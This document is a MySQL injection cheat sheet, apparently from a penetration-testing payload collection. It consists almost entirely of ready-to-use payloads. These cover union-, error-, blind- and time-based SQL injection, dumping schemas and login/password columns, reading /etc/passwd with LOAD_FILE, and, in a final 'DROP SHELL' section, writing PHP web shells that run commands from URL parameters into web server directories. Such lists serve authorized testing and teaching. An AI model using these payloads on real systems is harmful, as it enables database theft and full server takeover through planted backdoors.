# MYSQL Injection

## Comments

```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```

## Interesting Functions

Confirm Mysql:

```sql
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```

Usefull functions:
```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```

## Flow

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
```

**Only 1 value**
- Use *group_concat()*
- Use *Limit X,1*

**Blind one by one**
- Use *substr(version(),X,1)='r'* or *substring(version(),X,1)=0x70* or *ascii(substr(version(),X,1))=112*
- Use mid(version(),X,1)='5'

**Blind adding**
- *LPAD(version(),1...lenght(version()),'1')='asd'...*
- *RPAD(version(),1...lenght(version()),'1')='asd'...*
- *SELECT RIGHT(version(),1...lenght(version()))='asd'...*
- *SELECT LEFT(version(),1...lenght(version()))='asd'...*
- *SELECT INSTR('foobarbar', 'fo...')=1*

## Detect columns number

Using a simple ORDER

```sql
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```

## MySQL Union Based

```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

## MySQL Error Based - Basic

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```

## MYSQL Error Based - UpdateXML function

```sql
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Shorter to read:

```sql
' and updatexml(null,concat(0x0a,version()),null)-- -
' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

## MYSQL Error Based - Extractvalue function

```sql
AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```

## MYSQL Blind using a conditional statement

TRUE: `if @@version starts with a 5`:

```sql
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
Response:
HTTP/1.1 500 Internal Server Error
```

False: `if @@version starts with a 4`:

```sql
2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
Response:
HTTP/1.1 200 OK
```

## MYSQL Blind with MAKE_SET

```sql
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
```

## MYSQL Time Based

```sql
+BENCHMARK(40000000,SHA1(1337))+
'%2Bbenchmark(3200,SHA1(1))%2B'
' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2

AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
```

## MYSQL play with files

**Read content: **

```sql
' union select LOAD_FILE('/etc/passwd') --
```

**Write content to file: **

```sql
select * from users into outfile "/tmp/sql.txt";
```

**Copy file: **

```sql
select load_file(“/etc/passwd”) into outfile "/tmp/pass.txt";
```

**Update value with content of a file: **

```sql
UPDATE tabla SET columna=LOAD_FILE(‘/tmp/file’) WHERE id=1;
```

**Create table and save file: **

```sql
create table temporal( data varchar(8000));
load data infile '/etc/passwd' into table temporal
```

## MySQL DIOS - Dump in One Shot

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

## MYSQL DROP SHELL

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
-1 UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```
